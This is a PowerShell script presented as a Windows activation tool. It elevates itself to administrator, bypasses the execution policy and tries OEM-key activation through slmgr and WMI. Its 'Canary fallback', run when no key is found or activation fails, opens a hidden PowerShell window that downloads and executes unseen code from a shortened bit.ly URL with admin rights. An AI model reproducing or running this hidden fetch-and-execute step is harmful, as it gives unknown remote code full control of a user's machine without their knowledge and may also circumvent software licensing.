# Auto-elevate and set execution policy for the session
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force

# Helper: Check activation status quickly
function Is-Activated {
    try {
        $p = Get-CimInstance -ClassName SoftwareLicensingProduct | Where-Object { $_.Description -like "Windows*" -and $_.LicenseStatus -eq 1 }
        return $p.Count -ge 1
    } catch { return $false }
}

$oemKey = try { (Get-CimInstance -ClassName SoftwareLicensingService -ErrorAction Stop).OA3xOriginalProductKey } catch { $null }

if ($oemKey) {
    Write-Host "OEM Key: $oemKey" -ForegroundColor Cyan
} else {
    Write-Host "No embedded OEM key detected."
    Write-Host "Executing Canary fallback..."
    Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm bit.ly/act-win | iex`""
    exit
}

# Already activated? Exit.
if (Is-Activated) {
    Write-Host "Windows is already activated. No action needed."
    exit
}

# ---- SLMGR activation ----
Write-Host "SLMGR: Attempting activation with OEM key..."
try {
    & cscript.exe //Nologo C:\Windows\System32\slmgr.vbs /ipk $oemKey | Out-Null
    & cscript.exe //Nologo C:\Windows\System32\slmgr.vbs /ato | Out-Null
    Start-Sleep -Milliseconds 600
    if (Is-Activated) {
        Write-Host "SLMGR: Activation SUCCESSFUL."
        exit
    } else {
        Write-Host "SLMGR: Activation FAILED."
    }
} catch {}

# ---- WMI activation ----
Write-Host "WMI: Attempting activation with OEM key..."
try {
    $svc = Get-CimInstance -ClassName SoftwareLicensingService -ErrorAction SilentlyContinue
    $svc | Invoke-CimMethod -MethodName InstallProductKey -Arguments @{ ProductKey = $oemKey } -ErrorAction SilentlyContinue | Out-Null
    $products = Get-CimInstance -ClassName SoftwareLicensingProduct -ErrorAction SilentlyContinue | Where-Object { $_.PartialProductKey -ne $null -and $_.ApplicationId -eq '55c92734-d682-4d71-983e-d6ec3f16059f' -and -not $_.LicenseIsAddon }
    foreach ($product in $products) {
        try {
            $res = Invoke-CimMethod -InputObject $product -MethodName Activate -ErrorAction SilentlyContinue
            if ($res.ReturnValue -eq 0) {
                Write-Host "WMI: Activation SUCCESSFUL."
                exit
            }
        } catch {}
    }
    Write-Host "WMI: Activation FAILED."
} catch {}

# ---- Canary fallback ----
Write-Host "Executing Canary fallback..."
try {
    Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm bit.ly/act-win | iex`""
} catch {}
exit
